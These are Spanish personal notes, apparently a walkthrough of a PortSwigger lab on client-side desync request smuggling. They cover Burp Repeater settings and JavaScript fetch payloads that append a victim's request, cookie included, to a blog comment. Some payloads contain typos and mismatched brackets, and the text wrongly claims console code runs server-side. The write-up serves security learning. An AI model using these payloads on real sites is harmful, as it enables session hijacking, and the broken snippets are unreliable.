Para este ataque necesitaríamos un servidor que soporte solo HTTP/1.1 e ignore el content-length.
Para saber si nuestro endpoint no soporte el HTTP/2, vamos a la solicitud dentro del repeater, en brupsuite, y al upgradearlo a 2 vemos un cartel debajo a la izquierda que dice:
"Server ALPN does not advertise HTTP/2 support. You can force HTTP/2 from the Repeater menu."
si le hacemos caso a esta advertecnia y en la ruedita de settings le damos clikc a "Allow HTTP/2 ALPN override" y obtenemos un error nuevamente que dice "Stream failed  to close correctly" y esto lo confirma. Asegurate de tener activado "Enable HTTP/1 connection reuse". dentro del repeater y en la parte de pestañas, le damos al ícono de más (+) y elijimos la última opción de "create a tab group" que nos da. Esto nos creara una carpeta con el grupo de pestañas que seleccionemos, y serán como un grupo en el que podemos sincronizar solicitudes HTTP en la misma conexión tcp, en el dropdown del botón send (el cual envía las peticiones) y elegimos "Send group in sequence (in a single connection)"
Escribimos lo siguiente en la consola
```
fetch("https://portswiggerlab.net/", {
	method: "POST",
	BODY: "get /Hopefully404 HTTP/1,1\r\nX-Ignore: X",
	credentials: "include", //ensures we use the 'with-cookies connection pool'
	mode: "cors", 
	})
```
El mode cors es porque la solicitud retornará un 302 redirect y nos tenemos que asegurar de que este no sea seguido para que no nos rompa todo. También utilizamos catch

```
fetch("https://portswiggerlab.net/", {
	method: "POST",
	BODY: "get /Hopefully404 HTTP/1,1\r\nX-Ignore: X",
	credentials: "include", //ensures we use the 'with-cookies connection pool'
	mode: "cors", 
	}).catch(() => {
		fetch("https://portswiggerlab.net/", 
			{
			moed: "no-cores",
			credentials: "include",
			}
		)
	)
```
Y todo esto se copia en la consola, para que se ejecute justamente del lado del servidor, porque no hay ningún backend que opere detrás.

Tomamos la petición del post comentario, dejamos el comentario al final para que este se concatene con la request y podamos ver la cookie:
```
smuggledRequest= [
"POST /en/post/comment HTTP/1.1",
"Host: 0a7900d1044d8d8783581eca00fc00d5.h1-web-security-academy.net",
"Cookie: session=4xgZedVgP7B7XeVCDxc6aTAaxBorGGR3",
"Connection: keep-alive",
"Content-Length: 157",
"",
"csrf=BtLJFAn0VnDd91R7M1lt6LEsJa8YHkcF&postId=4&name=asd&email=crummy_mockup@gmail.com&website=http://yeg6wpk2ywy45wjx5i0go9oii9o0ct0i.oastify.com&comment=asd",
].join("\r\n");

fetch("https://0a7900d1044d8d8783581eca00fc00d5.h1-web-security-academy.net/", {
	method: "POST",
	BODY: "get /Hopefully404 HTTP/1,1\r\nX-Ignore: X",
	credentials: "include",
	mode: "cors", 
	}).catch(() => {
		fetch("https://0a7900d1044d8d8783581eca00fc00d5.h1-web-security-academy.net/", 
			{
			moed: "no-cores",
			credentials: "include",
			}
		)
	})
```
Lo cual es respondido con un:
```
[[Prototype]]: Promise[[PromiseState]]: "pending"[[PromiseResult]]: undefined
```
Pero en el mejor de los casos va a decir "response", esto significa que capturo una solicitud, por lo cual requerirá varios intentos
![[Pasted image 20240818005217.png]]
Y cuando eso suceda vamos a Network y esta presente la respuesta:
![[Pasted image 20240818005321.png]]
